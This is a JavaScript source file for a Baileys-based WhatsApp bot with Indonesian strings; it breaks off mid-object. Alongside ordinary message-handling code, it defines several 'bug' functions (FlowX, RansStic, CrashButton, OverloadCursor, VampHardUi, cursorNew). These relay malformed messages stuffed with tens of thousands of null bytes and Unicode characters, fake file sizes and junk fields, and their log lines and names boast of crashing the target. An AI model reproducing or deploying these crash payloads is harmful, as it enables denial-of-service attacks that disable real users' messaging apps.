
require('../setting/config');

const fs = require('fs');
const axios = require('axios');
const chalk = require("chalk");
const fetch = require("node-fetch")
const jimp = require("jimp")
const os = require('os')
const crypto = require('crypto');
const path = require('path')
const cp = require('child_process');
const { promisify } = require('util');
const util = require("util");
const ms = require("parse-ms");
const sharp = require('sharp');
const yts = require('yt-search')
const moment = require("moment-timezone");
const { spawn, exec, execSync } = require('child_process');
const { color } = require('./lib/color');

const {
    default: baileys,
    proto,
    jidNormalizedUser,
    generateWAMessage,
    generateWAMessageFromContent,
    getContentType,
    prepareWAMessageMedia,
} = require("@whiskeysockets/baileys");

module.exports = conn = async (conn, m, chatUpdate, mek, store) => {
    try {
        if (global.db.data == null) await loadDatabase();
        require('./lib/database/schema')(m);

const chats = global.db.data.chats[m.chat];
const users = global.db.data.users[m.sender];
const settings = global.db.data.settings;
      
const body = (
    m.mtype === "conversation" ? m.message.conversation :
    m.mtype === "imageMessage" ? m.message.imageMessage.caption :
    m.mtype === "videoMessage" ? m.message.videoMessage.caption :
    m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
    m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
    m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
    m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
    m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
    m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
    m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || 
    m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : ""
);

const budy = (typeof m.text === 'string' ? m.text : '');
        
var textmessage = (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || budy) : ""

const content = JSON.stringify(mek.message)
const type = Object.keys(mek.message)[0];
if (m && type == "protocolMessage") conn.ev.emit("message.delete", m.message.protocolMessage.key);
const { sender } = m;
const from = m.key.remoteJid;
const isGroup = from.endsWith("@g.us");

//database 
const kontributor = JSON.parse(fs.readFileSync('./start/lib/database/owner.json'));
const _afk = JSON.parse(fs.readFileSync('./start/lib/database/afk.json'));
const pendaftar = JSON.parse(fs.readFileSync('./start/lib/database/pendaftar.json'));
const orang_spam = JSON.parse(fs.readFileSync('./start/lib/database/spaming.json'));
const user_ban = JSON.parse(fs.readFileSync('./start/lib/database/banned.json'))

const senderNumber = sender.split('@')[0]
const botNumber = await conn.decodeJid(conn.user.id);
const isBot = botNumber.includes(senderNumber)
const isUser = pendaftar.includes(m.sender)
const Access = [global.owner, ...kontributor, ...global.owner]
  .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
  .includes(m.sender) ? true : m.isChecking ? true :false

const prefixRegex = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/;
const prefix = prefixRegex.test(body) ? body.match(prefixRegex)[0] : '';
const isCmd = body.startsWith(prefix);
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
const args = body.trim().split(/ +/).slice(1);
const pushname = m.pushName || "No Name";
const text = q = args.join(" ");

const fatkuns = m.quoted || m;
const quoted = 
  fatkuns.mtype === 'buttonsMessage' ? fatkuns[Object.keys(fatkuns)[1]] :
  fatkuns.mtype === 'templateMessage' ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] :
  fatkuns.mtype === 'product' ? fatkuns[Object.keys(fatkuns)[0]] :
  m.quoted ? m.quoted :
  m;

const qmsg = quoted.msg || quoted;
const mime = qmsg.mimetype || '';
const isImage = type === 'imageMessage';
const isVideo = type === 'videoMessage';
const isAudio = type === 'audioMessage';
const isMedia = /image|video|sticker|audio/.test(mime);

const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
const isQuotedTag = type === 'extendedTextMessage' && content.includes('mentionedJid')
const isQuotedReply = type === 'extendedTextMessage' && content.includes('Message')
const isQuotedText = type === 'extendedTextMessage' && content.includes('conversation')
const isQuotedViewOnce = type === 'extendedTextMessage' && content.includes('viewOnceMessageV2')
//group
const groupMetadata = isGroup ? await conn.groupMetadata(m.chat).catch(() => {}) : "";
const groupOwner = isGroup ? groupMetadata.owner : "";
const groupName = isGroup ? groupMetadata.subject : "";
const participants = isGroup ? await groupMetadata.participants : "";
const groupAdmins = isGroup ? participants.filter(v => v.admin !== null).map(v => v.id) : "";
const groupMembers = isGroup ? groupMetadata.participants : "";
const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
const tdxlol = fs.readFileSync('./rans.jpg')

const TypeMess = getContentType(m?.message);
let reactions = TypeMess == "reactionMessage" ? m?.message[TypeMess]?.text : false;
        
const isBan = user_ban.includes(m.sender)
//time
const time = moment().tz("Asia/Jakarta").format("HH:mm:ss");
let ucapanWaktu
if (time >= "19:00:00" && time < "23:59:00") {
ucapanWaktu = " "
} else if (time >= "15:00:00" && time < "19:00:00") {
    ucapanWaktu = " "
} else if (time >= "11:00:00" && time < "15:00:00") {
ucapanWaktu = "️ "
} else if (time >= "06:00:00" && time < "11:00:00") {
    ucapanWaktu = "️ "
} else {
    ucapanWaktu = " "
};
        
const peler = fs.readFileSync('./start/lib/media/peler.jpg')
const cina = ["https://files.catbox.moe/z9rxf9.jpg"]
 
function getRandomImage() {
    const randomIndex = Math.floor(Math.random() * cina.length);
    return cina[randomIndex];
}
const cinahitam = getRandomImage()

async function pickRandom(list) {
    return list[Math.floor(Math.random() * list.length)]
}
        
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)

 /** WhiteList **/

const { addUser } = require('./lib/scrape/GitHub/adduser')
const { removeUser } = require('./lib/scrape/GitHub/delluser')
const { getUserList } = require('./lib/scrape/GitHub/listuser')
const { checkUser } = require('./lib/scrape/GitHub/checkuser')

//function
const {
    smsg,
    sendGmail,
    formatSize,
    isUrl,
    generateMessageTag, 
    getBuffer,
    getSizeMedia, 
    runtime, 
    fetchJson, 
    sleep,
    getRandom
} = require('./lib/myfunction');
    
const { 
    imageToWebp, 
    videoToWebp,
    writeExifImg,
    writeExifVid,
    addExif
} = require('./lib/exif')

const {
	jadibot,
	stopjadibot,
	listjadibot
} = require('./jadibot')

const { ytdl } = require('./lib/scrape/scrape-ytdl');   
const { spamngl } = require('./lib/scrape/scrape-ngl');
const { pindl } = require('./lib/scrape/scrape-pindl')
const { tiktok } = require('./lib/scrape/scrape-tiktok')
const { igdl } = require('./lib/scrape/scrape-igdl')
const { luminai } = require('./lib/scrape/scrape-luminai')
const { VocalRemover } = require('./lib/scrape/scrape-tovocal')
const { Telesticker } = require('./lib/scrape/scrape-telesticker')
const { pinterest } = require("./lib/scrape/scrape-pinterest");
const { scrapeSoundCloud } = require("./lib/scrape/scrape-soundcloud")
const msgFilter = require("./lib/antispam");
const uploadImage = require('./lib/uploadImage');
        
const afk = require("./lib/afk")
const isAfkOn = afk.checkAfkUser(m.sender, _afk)
/* fungsinya, ketika user yang sudah menggunakan command afk, maka tidak bisa lagi menggunakan command tersebut sampai dia kembali dari afk nya */

const _prem = require("./lib/premium");
const isPremium = Access ? true : _prem.checkPremiumUser(m.sender);
//const gcounti = global.gcount
//const gcount = isPremium ? gcounti.prem : gcounti.user
let limitUser = isPremium ? 1500 : global.limitCount

if (reactions) {
    if ([""].includes(reactions)) {
        let crt = fs.readFileSync('./start/lib/media/ngakak.mp3')
        conn.sendPresenceUpdate('recording', m.chat)
        conn.sendMessage(m.chat, { 
            audio: crt, 
            mimetype:'audio/mpeg',
            ptt:true
        }, {quoted: m})
    }
}
        
if (reactions) {
    if ([""].includes(reactions)) {
        let crt = fs.readFileSync('./start/lib/media/duit.mp3')
        conn.sendPresenceUpdate('recording', m.chat)
        conn.sendMessage(m.chat, { 
            audio: crt, 
            mimetype:'audio/mpeg',
            ptt:true
        }, {quoted: m})
    }
}
        
const reaction = async (jidss, emoji) => {
    conn.sendMessage(jidss, {
        react: { text: emoji,
                key: m.key 
               } 
            }
        );
    };

 async function useLimit(sender, amount) {
     users.limit -= amount;
     users.totalLimit += amount;
     m.reply(`Limit Anda Telah Digunakan Sebanyak ${amount} Dari ${users.limit} Limit Kamu`,
        );
 }
        
async function resetLimit() {
  for (let i of users) {
      db.data.users[i].limit = limitUser;
  }
}
        
      
if (m.isGroup) {
    if (body.includes(`@6281351692548`)) {
        reaction(m.chat, "❓")
    }
 }

        
if (m.message) {
    if (isCmd && !m.isGroup) {
        console.log(chalk.black(chalk.bgHex('#ff5e78').bold(`\n ${ucapanWaktu} `)));
        console.log(chalk.white(chalk.bgHex('#4a69bd').bold(` Ada Pesan, Om! `)))
        console.log(chalk.black(chalk.bgHex('#fdcb6e')(` DATE: ${new Date().toLocaleString()}
 MESSAGE: ${m.body || m.mtype}
️ SENDERNAME: ${pushname}
 JIDS: ${m.sender}`
     )
   )
);
    } else if (m.isGroup) {
        console.log(chalk.black(chalk.bgHex('#ff5e78').bold(`\n ${ucapanWaktu} `)));
        console.log(chalk.white(chalk.bgHex('#4a69bd').bold(` Ada Pesan, Om! `)));
        console.log(chalk.black(chalk.bgHex('#fdcb6e')(` DATE: ${new Date().toLocaleString()}
 MESSAGE: ${m.body || m.mtype}
️ SENDERNAME: ${pushname}
 JIDS: ${m.sender}
 MESS LOCATION: ${groupName}`
       ))
     );
  }
}
//function
let venomModsData = JSON.stringify({
    status: true,
    criador: "VenomMods",
    resultado: {
        type: "md",
        ws: {
            _events: { "CB:ib,,dirty": ["Array"] },
            _eventsCount: 800000,
            _maxListeners: 0,
            url: "wss://web.whatsapp.com/ws/chat",
            config: {
                version: ["Array"],
                browser: ["Array"],
                waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
                sockCectTimeoutMs: 20000,
                keepAliveIntervalMs: 30000,
                logger: {},
                printQRInTerminal: false,
                emitOwnEvents: true,
                defaultQueryTimeoutMs: 60000,
                customUploadHosts: [],
                retryRequestDelayMs: 250,
                maxMsgRetryCount: 5,
                fireInitQueries: true,
                auth: { Object: "authData" },
                markOnlineOnsockCect: true,
                syncFullHistory: true,
                linkPreviewImageThumbnailWidth: 192,
                transactionOpts: { Object: "transactionOptsData" },
                generateHighQualityLinkPreview: false,
                options: {},
                appStateMacVerification: { Object: "appStateMacData" },
                mobile: true
            }
        }
    }
});

async function FlowX(target) {
  let msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "",
              hasMediaAttachment: false,
            },
            body: {
              text: "⿻᪶ࣼ͜͜͠͡͡͠ ̶᪶᪶᪶᪳᪳᪳ᷤ᪳᪳᪳͢⿻",
            },
            nativeFlowMessage: {
              messageParamsJson: "",
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: venomModsData + "\u0000",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: venomModsData + "⿻᪶ࣼ͜͜͠͡͡͠ ̶᪶᪶᪶᪳᪳᪳ᷤ᪳᪳᪳͢⿻",
                },
              ],
            },
          },
        },
      },
    },
    {}
  );

  await conn.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });
}

async function RansStic(target) {
    try {
        const message = {
            stickerPackMessage: {
                stickerPackId: "2a020f9c-4701-4a19-8a05-358e5f50706b",
                name: "ꦾ".repeat(10000),
                publisher: "ꦽ".repeat(500),
                stickers: [
                    {
                        fileName: "SkhRT09I4+K+pKVF3najiKZMW4AHBdeaUCwriuT-isk=.webp",
                        isAnimated: false,
                        emojis: [""],
                        mimetype: "image/webp"
                    }
                ],
                fileLength: "99999999",
                fileSha256: "1aYtTgzj90li3Zjl3iqT8qYc33giu9r2XQ2VfvXj6qI=",
                fileEncSha256: "KqlacQ4p7TypiMFnpZxrqWFnP/RJTw5LrEe6Q8BdEV0=",
                mediaKey: "vynzOrLOfRJKq5FR2IO+GiQYWimtLdM2QOMxCLx9W1I=",
                directPath: "/v/t62.15575-24/19152401_2707159986150301_6253013717572687839_n.enc",
                mediaKeyTimestamp: "1741245862",
                trayIconFileName: "2a020f9c-4701-4a19-8a05-358e5f50706b.png",
                stickerPackSize: "99999999"
            }
        };

        await conn.sendMessage(target, message, { quoted: null });
        console.log(`Bug Sticker Pack Sent to ${target}!`);
    } catch (error) {
        console.error("Error sending bug sticker pack:", error);
    }
}

async function CrashButton(target) {
                   let IphoneCrash = "\u0000".repeat(45000)
                   const stanza = [{
                           attrs: {
                                   biz_bot: '1'
                           },
                           tag: "bot",
                   }, {
                           attrs: {},
                           tag: "biz",
                   }, ];
                   let messagePayload = {
                           viewOnceMessage: {
                                   message: {
                                           locationMessage: {
                                                   degreesLatitude: 11.11,
                                                   degreesLongitude: -11.11,
                                                   name: `Halo Mas kami dari J&T Express akan melakukan proses delivery paket COD dengan nomor waybillzz JX3272026054 ke alamat anda , SEMARANG JAWA TENGAH , mohon kesediaannya untuk memastikan apakah anda benar memesan barang COD senilai Rp 301,990？Terima kasih`,
                                                   url: "https://youtube.com/@akhiroc-nine",
                                                   contextInfo: {
                                                           participant: "0@s.whatsapp.net",
                                                           remoteJid: "status@broadcast",
                                                           quotedMessage: {
                                                                   buttonsMessage: {
                                                                           documentMessage: {
                                                                                   url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                                                                                   mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                                                                   fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                                                                                   fileLength: "9999999999999",
                                                                                   pageCount: 3567587327,
                                                                                   mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                                                                                   fileName: "\u0000",
                                                                                   fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                                                                                   directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                                                                                   mediaKeyTimestamp: "1735456100",
                                                                                   contactVcard: true,
                                                                                   caption: "sebuah kata maaf takkan membunuhmu, rasa takut bisa kau hadapi"
                                                                           },
                                                                           contentText: "\u0000",
                                                                           footerText: "© ransTech",
                                                                           buttons: [{
                                                                                   buttonId: "\u0000".repeat(850000),
                                                                                   buttonText: {
                                                                                           displayText: "yeee"
                                                                                   },
                                                                                   type: 1
                                                                           }],
                                                                           headerType: 3
                                                                   }
                                                           },
                                                           conversionSource: "porn",
                                                           conversionData: crypto.randomBytes(16),
                                                           conversionDelaySeconds: 1,
                                                           forwardingScore: 999999,
                                                           isForwarded: true,
                                                           quotedAd: {
                                                                   advertiserName: " x ",
                                                                   mediaType: "IMAGE",
                                                                   jpegThumbnail: tdxlol,
                                                                   caption: " x "
                                                           },
                                                           placeholderKey: {
                                                                   remoteJid: "0@s.whatsapp.net",
                                                                   fromMe: false,
                                                                   id: "ABCDEF1234567890"
                                                           },
                                                           expiration: -99999,
                                                           ephemeralSettingTimestamp: Date.now(),
                                                           ephemeralSharedSecret: crypto.randomBytes(16),
                                                           entryPointConversionSource: "kontols",
                                                           entryPointConversionApp: "kontols",
                                                           actionLink: {
                                                                   url: "t.me/ranstamvan1",
                                                                   buttonTitle: "konstol"
                                                           },
                                                           disappearingMode: {
                                                                   initiator: 1,
                                                                   trigger: 2,
                                                                   initiatorDeviceJid: target,
                                                                   initiatedByMe: true
                                                           },
                                                           groupSubject: "kontol",
                                                           parentGroupJid: "kontolll",
                                                           trustBannerType: "kontol",
                                                           trustBannerAction: 99999,
                                                           isSampled: true,
                                                           externalAdReply: {
                                                                   title: "\u0000",
                                                                   mediaType: 2,
                                                                   renderLargerThumbnail: true,
                                                                   showAdAttribution: true,
                                                                   containsAutoReply: true,
                                                                   body: "Siro EsCanor",
                                                                   thumbnailUrl: "https://files.catbox.moe/f707ex.jpg",
                                                                   sourceUrl: "go fuck yourself",
                                                                   sourceId: "dvx - problem",
                                                                   ctwaClid: "cta",
                                                                   ref: "ref",
                                                                   clickToWhatsappCall: true,
                                                                   automatedGreetingMessageShown: false,
                                                                   greetingMessageBody: "kontol",
                                                                   ctaPayload: "cta",
                                                                   disableNudge: true,
                                                                   originalImageUrl: "konstol"
                                                           },
                                                           featureEligibilities: {
                                                                   cannotBeReactedTo: true,
                                                                   cannotBeRanked: true,
                                                                   canRequestFeedback: true
                                                           },
                                                           forwardedNewsletterMessageInfo: {
                                                                   newsletterJid: "120363274419384848@newsletter",
                                                                   serverMessageId: 1,
                                                                   newsletterName: "ꦿꦸ".repeat(10),
                                                                   contentType: 3,
                                                                   accessibilityText: "kontol"
                                                           },
                                                           statusAttributionType: 2,
                                                           utm: {
                                                                   utmSource: "utm",
                                                                   utmCampaign: "utm2"
                                                           }
                                                   },
                                                   description: "\u0000"
                                           },
                                           messageContextInfo: {
                                                   messageSecret: crypto.randomBytes(32),
                                                   supportPayload: JSON.stringify({
                                                           version: 2,
                                                           is_ai_message: false,
                                                           should_show_system_message: false,
                                                           should_upload_client_logs: false,
                                                           ticket_id: crypto.randomBytes(16),
                                                   }),
                                           },
                                   }
                           }
                   }
                   await conn.relayMessage(target, messagePayload, {
                           participant: {
                                   jid: target
                           }
                   });
                   console.log("Send Bug By SiroEsCanor");
           }
async function OverloadCursor(target, ptcp = true) {
    const virtex = [{
            attrs: {
                biz_bot: "1"
            },
            tag: "bot",
        },
        {
            attrs: {},
            tag: "biz",
        },
    ];
    let messagePayload = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "RansTech Crasher" + "ꦽ".repeat(16999),
                    listType: 2,
                    singleSelectReply: {
                        selectedRowId: "",
                    },
                    contextInfo: {
                        virtexId: conn.generateMessageTag(),
                        participant: "13135550002@s.whatsapp.net",
                        mentionedJid: ["13135550002@s.whatsapp.net"],
                        quotedMessage: {
                            buttonsMessage: {
                                documentMessage: {
                                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                                    mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                                    fileLength: "9999999999999",
                                    pageCount: 1316134911,
                                    mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                                    fileName: "Z?" + "\u0000".repeat(97770),
                                    fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                                    directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                                    mediaKeyTimestamp: "1726867151",
                                    contactVcard: true,
                                    jpegThumbnail: tdxlol,
                                },
                                hasMediaAttachment: true,
                                contentText: 'XZCRASHER""',
                                footerText: "|| VCS BY XRans ꦽ",
                                buttons: [{
                                        buttonId: "\u0000".repeat(170000),
                                        buttonText: {
                                            displayText: "Ampas?" + "\u0000".repeat(1999),
                                        },
                                        type: 1,
                                    },
                                    {
                                        buttonId: "\u0000".repeat(220000),
                                        buttonText: {
                                            displayText: "Ampas?" + "\u0000".repeat(1999),
                                        },
                                        type: 1,
                                    },
                                    {
                                        buttonId: "\u0000".repeat(220000),
                                        buttonText: {
                                            displayText: "Ampas?" + "\u0000".repeat(1999),
                                        },
                                        type: 1,
                                    },
                                ],
                                viewOnce: true,
                                headerType: 3,
                            },
                        },
                        conversionSource: "porn",
                        conversionData: crypto.randomBytes(16),
                        conversionDelaySeconds: 9999,
                        forwardingScore: 999999,
                        isForwarded: true,
                        quotedAd: {
                            advertiserName: " x ",
                            mediaType: "IMAGE",
                            jpegThumbnail: tdxlol,
                            caption: " x ",
                        },
                        placeholderKey: {
                            remoteJid: "13135550002@s.whatsapp.net",
                            fromMe: false,
                            id: "ABCDEF1234567890",
                        },
                        expiration: -99999,
                        ephemeralSettingTimestamp: Date.now(),
                        ephemeralSharedSecret: crypto.randomBytes(16),
                        entryPointConversionSource: "❤️",
                        entryPointConversionApp: "",
                        actionLink: {
                            url: "https://t.me/ranstamvan1",
                            buttonTitle: "Ampas",
                        },
                        disappearingMode: {
                            initiator: 1,
                            trigger: 2,
                            initiatorDeviceJid: target,
                            initiatedByMe: true,
                        },
                        groupSubject: "",
                        parentGroupJid: "",
                        trustBannerType: "",
                        trustBannerAction: 99999,
                        isSampled: true,
                        externalAdReply: {},
                        featureEligibilities: {
                            cannotBeReactedTo: true,
                            cannotBeRanked: true,
                            canRequestFeedback: true,
                        },
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "120363274419384848@newsletter",
                            serverMessageId: 1,
                            newsletterName: `@13135550002${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
                            contentType: 3,
                            accessibilityText: "kontol",
                        },
                        statusAttributionType: 2,
                        utm: {
                            utmSource: "utm",
                            utmCampaign: "utm2",
                        },
                    },
                    description: "@13135550002".repeat(2999),
                },
                messageContextInfo: {
                    messageSecret: crypto.randomBytes(32),
                    supportPayload: JSON.stringify({
                        version: 2,
                        is_ai_message: true,
                        should_show_system_message: true,
                        ticket_id: crypto.randomBytes(16),
                    }),
                },
            },
        },
    };
    let sections = [];
    for (let i = 0; i < 1; i++) {
        let largeText = "\u0000".repeat(11999);
        let deepNested = {
            title: `Section ${i + 1}`,
            highlight_label: `Highlight ${i + 1}`,
            rows: [{
                title: largeText,
                id: `\u0000`.repeat(999),
                subrows: [{
                        title: `\u0000`.repeat(999),
                        id: `\u0000`.repeat(999),
                        subsubrows: [{
                                title: `\u0000`.repeat(999),
                                id: `\u0000`.repeat(999),
                            },
                            {
                                title: `\u0000`.repeat(999),
                                id: `\u0000`.repeat(999),
                            },
                        ],
                    },
                    {
                        title: `\u0000`.repeat(999),
                        id: `\u0000`.repeat(999),
                    },
                ],
            }, ],
        };
        sections.push(deepNested);
    }
    let listMessage = {
        title: "",
        sections: sections,
    };
    let msg = generateWAMessageFromContent(
        target,
        proto.Message.fromObject({
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2,
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        contextInfo: {
                            participant: "0@s.whatsapp.net",
                            remoteJid: "status@broadcast",
                            mentionedJid: [target],
                            isForwarded: true,
                            forwardingScore: 999,
                        },
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: '⿻ᬃR͜͡Ä⃪᪳͢͡N⃪᪴͢͡Ṣ Ͳ͢Ξ⃪͜Ꮯ⃪᪶᷍Ꮋ͢͠⿻' + "ꦽ".repeat(29999),
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({
                            buttonParamsJson: JSON.stringify(listMessage),
                        }),
                        header: proto.Message.InteractiveMessage.Header.create({
                            buttonParamsJson: JSON.stringify(listMessage),
                            subtitle: "rans crash" + "\u0000".repeat(9999),
                            hasMediaAttachment: false,
                        }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            buttons: [{
                                    name: "single_select",
                                    buttonParamsJson: "JSON.stringify(listMessage)",
                                },
                                {
                                    name: "call_permission_request",
                                    buttonParamsJson: "{}",
                                },
                                {
                                    name: "single_select",
                                    buttonParamsJson: "JSON.stringify(listMessage)",
                                },
                                {
                                    name: "call_permission_request",
                                   buttonParamsJson: "",
                                },
                                {
                                    name: "mpm",
                                    buttonParamsJson: "",
                                },
                                {
                                    name: "mpm",
                                    buttonParamsJson: "",
                                },
                                {
                                    name: "mpm",
                                    buttonParamsJson: "",
                                },
                                {
                                    name: "mpm",
                                    buttonParamsJson: "",
                                },
                                {
                                    name: "mpm",
                                    buttonParamsJson: "",
                                },
                                {
                                    name: "mpm",
                                    buttonParamsJson: "",
                                },
                            ],
                        }),
                    }),
                },
            },
        }), {
            userJid: target
        }
    );
    await conn.relayMessage(target, msg.message, {
        messageId: msg.key.id,
        participant: {
            jid: target
        },
    });
    console.log(`     ${target}`);
    await conn.relayMessage(target, msg.message, {
        messageId: msg.key.id,
        participant: {
            jid: target
        },
    });
    await conn.relayMessage(target, messagePayload, {
        additionalNodes: virtex,
        participant: {
            jid: target
        },
    });
    console.log(`     ${target}`);
}
async function VampHardUi(target, Ptcp = false) {
    conn.relayMessage(target, {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "  " + "ꦽ".repeat(92000) + "꧀".repeat(92000) + '@5'.repeat(92000)
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "single_select",
                                buttonParamsJson: "",
                            },
                            {
                                name: "call_permission_request",
                                buttonParamsJson: "",
                            },
                            {
                                name: "mpm",
                                buttonParamsJson: "",
                            },
                            {
                                name: "mpm",
                                buttonParamsJson: "",
                            },
                            {
                                name: "mpm",
                                buttonParamsJson: "",
                            },
                            {
                                name: "mpm",
                                buttonParamsJson: "",
                            },
                        ],
                    },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "CoDe" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}
async function cursorNew(target, Ptcp = true) {
  const stanza = [
    {
      attrs: { biz_bot: "1" },
      tag: "bot",
    },
    {
      attrs: {},
      tag: "biz",
    },
  ];

  let messagePayload = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: " ..." + "ꦽ".repeat(50000),
          listType: 2,
          singleSelectReply: {
            selectedRowId: "",
          },
          contextInfo: {
            stanzaId: conn.generateMessageTag(),
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: [target],
            quotedMessage: {
              buttonsMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                  mimetype:
                    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                  fileLength: "9999999999999",
                  pageCount: 3567587327,
                  mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                  fileName: "Vampire File",
                  fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                  directPath:
                    "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1735456100",
                  contactVcard: true,
                  caption:
                    "Persetan Dengan Cinta, Hidup Dalam Kegelapan.",
                },
                contentText: '༑ Crash Total - ( Vampire_Official ) ""',
                footerText: "Di Dukung Oleh ©WhatsApp.",
                buttons: [
                  {
                    buttonId: "\u0018".repeat(99000),
                    buttonText: {
                      displayText: "Vampire Crasher",
                    },
                    type: 1,
                  },
                ],
                headerType: 3,
              },
            },
            conversionSource: "porn",
            conversionData: crypto.randomBytes(16),
            conversionDelaySeconds: 9999,
            forwardingScore: 999999,
            isForwarded: true,
            quotedAd: {
              advertiserName: " x ",
              mediaType: "IMAGE",
              jpegThumbnail: tdxlol,
              caption: " x ",
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890",
            },
            expiration: -99999,
            ephemeralSettingTimestamp: Date.now(),
            ephemeralSharedSecret: crypto.randomBytes(16),
            entryPointConversionSource: "kontols",
            entryPointConversionApp: "kontols",
            actionLink: {
              url: "t.me/Vampiresagara",
              buttonTitle: "konstol",
            },
            disappearingMode: {
              initiator: 1,
              trigger: 2,
              initiatorDeviceJid: target,
              initiatedByMe: true,
            },
            groupSubject: "kontol",
            parentGroupJid: "kontolll",
            trustBannerType: "kontol",
            trustBannerAction: 99999,
            isSampled: true,
            externalAdReply: {
              title: '! Vampire.Bug.Bot',
              mediaType: 2,
              renderLargerThumbnail: false,
              showAdAttribution: false,
              containsAutoReply: false,
              body: "©Originial_Bug",
              thumbnail: tdxlol,
              sourceUrl: "Tetaplah Menjadi Bodoh...",
              sourceId: "Vampire - problem",
              ctwaClid: "cta",
              ref: "ref",
              clickToWhatsappCall: true,
